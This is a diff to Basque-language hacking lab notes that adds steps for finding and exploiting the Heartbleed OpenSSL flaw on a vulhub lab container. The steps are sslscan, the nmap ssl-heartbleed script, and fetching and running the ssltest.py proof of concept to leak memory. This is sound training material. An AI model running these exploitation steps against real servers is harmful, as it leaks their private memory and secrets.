@@ -14,6 +14,8 @@
 - [HTTP eta HTTPS enumerazioa](#http-eta-https-enumerazioa)
   - [Tinder aztertu](#tinder-aztertu)
   - [Hearbleed ssl kalteberatasuna aztertzen](#hearbleed-ssl-kalteberatasuna-aztertzen)
+    - [nmap-ekin aztertu heartbleed duenik](#nmap-ekin-aztertu-heartbleed-duenik)
+  - [Python](#python)
 
 
 # FTP ennumerazioa
@@ -283,3 +285,49 @@ Adibidez, Heartbleed segurtasun-kalteberatasun bat da, OpenSSL liburutegiari era
 Jarraian, Githuben proiekturako esteka ematen da. Bertan, Heartbleed-era kaltebera den laborategia hedatzen dugu: (jada hacking laboratoriora gehituta)
 
 CVE-2014-0160: https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160
+
+Makina altzatu eta gero, izena/ip + portua erabiliz eskaneatuko dugu.
+
+```bash
+sslscan nginx-hearbleed:443
+```
+
+Erantzunean ikus beharko genuke bulnerablea dela.
+
+### nmap-ekin aztertu heartbleed duenik
+
+Scripta azterketa hau egiteko eskuragarri egon beharko litzateke.
+
+```bash
+locate .nse | grep heartbleed
+```
+
+Scripta exekutatu:
+
+```bash
+nmap --script ssl-heartbleed -p443 nginx-hearbleed
+```
+
+
+## Python
+
+Aurreko hearbleed makinako reposiotrioan python script bat uzten digute 
+
+Instalatu python:
+```bash
+apt install python3 python3-venv
+```
+
+Deskargatu python scripta repositoriotik:
+
+```bash
+wget 'https://github.com/vulhub/vulhub/blob/master/openssl/CVE-2014-0160/ssltest.py?raw=true' -O ssltest.py
+```
+
+Exekutatu python script, ssl zihurtagiria ikusteko. Ideia, script hau behin eta berriz exekutatzea da eta informazio leakeageak aurkitzea izango litzateke.
+
+```bash
+python3 ssltest.py nginx-heartbleed -p 443
+```
+
+- -v "00 00 ... 00" parametroa gehituz, kate hau daukaten lerroak izkutatuko dira.
